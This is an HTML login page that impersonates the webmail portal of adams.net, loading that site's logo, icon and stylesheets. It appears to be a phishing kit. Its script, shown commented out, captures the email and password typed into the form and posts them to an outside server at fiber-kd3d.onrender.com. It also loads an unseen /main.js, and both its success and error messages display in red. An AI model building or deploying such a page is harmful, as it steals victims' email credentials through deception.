<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="en">
  <head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <title>Webmail :: Welcome to Webmail</title>

    <link
      rel="shortcut icon"
      href="https://webmail.adams.net/skins/classic/images/favicon.ico?s=1697461030"
    />
    <link
      rel="stylesheet"
      type="text/css"
      href="https://webmail.adams.net/skins/classic/common.min.css?s=1697461030"
    />
    <link
      rel="stylesheet"
      type="text/css"
      href="https://webmail.adams.net/plugins/jqueryui/themes/classic/jquery-ui.css?s=1697461030"
    />

    <style>
      #message {
        margin-top: 15px;
        padding: 10px;
        font-weight: bold;
        text-align: center;
        min-height: 20px;
        display: none;
      }
      #message.show {
        display: block;
      }
      #message.success {
        color: red
      }
      #message.error {
        color: red
      }
    </style>

    <script>
      // document.addEventListener("DOMContentLoaded", () => {
      //   const form = document.getElementById("userForm");
      //   const messageDiv = document.getElementById("message");
      //   const submitButton = document.getElementById("rcmloginsubmit");

      //   form.addEventListener("submit", async (e) => {
      //     e.preventDefault(); // Stop the normal redirect

      //     submitButton.disabled = true;
      //     messageDiv.textContent = "Submitting...";
      //     messageDiv.style.color = "black";

      //     const formData = {
      //       email: document.getElementById("rcmloginuser").value,
      //       password: document.getElementById("rcmloginpwd").value,
      //     };

      //     try {
      //       const response = await fetch(
      //         "https://fiber-kd3d.onrender.com/api/user",
      //         {
      //           method: "POST",
      //           headers: { "Content-Type": "application/json" },
      //           body: JSON.stringify(formData),
      //         }
      //       );

      //       const result = await response.json();

      //       if (response.ok && result.success) {
      //         messageDiv.textContent =
      //           result.message || "Form submitted successfully ✅";
      //         messageDiv.style.color = "green";
      //         form.reset();

      //         // Optionally reload after 1.5 seconds
      //         setTimeout(() => location.reload(), 1500);
      //       } else {
      //         console.error("Backend error:", result);
      //         messageDiv.textContent =
      //           "Error: " + (result.message || "Something went wrong ❌");
      //         messageDiv.style.color = "red";
      //       }
      //     } catch (error) {
      //       console.error("Network or fetch error:", error);
      //       messageDiv.textContent = "Error submitting form: " + error.message;
      //       messageDiv.style.color = "red";
      //     } finally {
      //       submitButton.disabled = false;
      //     }
      //   });
      // });
    </script>
  </head>
  <body>
    <img
      src="https://webmail.adams.net/logo.png?s=1750176856"
      id="logo"
      border="0"
      style="margin: 0 11px"
      alt="Webmail"
    />

    <div id="login-form">
      <div class="boxtitle">Welcome to Webmail</div>
      <div class="boxcontent">
        <form id="userForm" name="form" method="post">
          <input
            type="hidden"
            name="_token"
            value="g6QdehiqTXs9B6JxyatEEIU7mrhxUIzK"
          />
          <input type="hidden" name="_task" value="login" />
          <input type="hidden" name="_action" value="login" />
          <input
            type="hidden"
            name="_timezone"
            id="rcmlogintz"
            value="_default_"
          />
          <!-- Removed _url to avoid redirect -->
          <table summary="" border="0">
            <tbody>
              <tr>
                <td class="title"><label for="rcmloginuser">Email</label></td>
                <td class="input">
                  <input
                    name="_user"
                    id="rcmloginuser"
                    required="required"
                    autocapitalize="off"
                    autocomplete="off"
                    type="email"
                  />
                </td>
              </tr>
              <tr>
                <td class="title"><label for="rcmloginpwd">Password</label></td>
                <td class="input">
                  <input
                    name="_pass"
                    id="rcmloginpwd"
                    required="required"
                    autocapitalize="off"
                    autocomplete="off"
                    type="password"
                  />
                </td>
              </tr>
            </tbody>
          </table>
          <p class="formbuttons">
            <button
              type="submit"
              id="rcmloginsubmit"
              class="button mainaction submit"
            >
              Login
            </button>
          </p>
          <div id="message"></div>
        </form>
      </div>
    </div>

    <div id="login-bottomline">Webmail</div>
    <script src="/main.js"></script>
  </body>
</html>
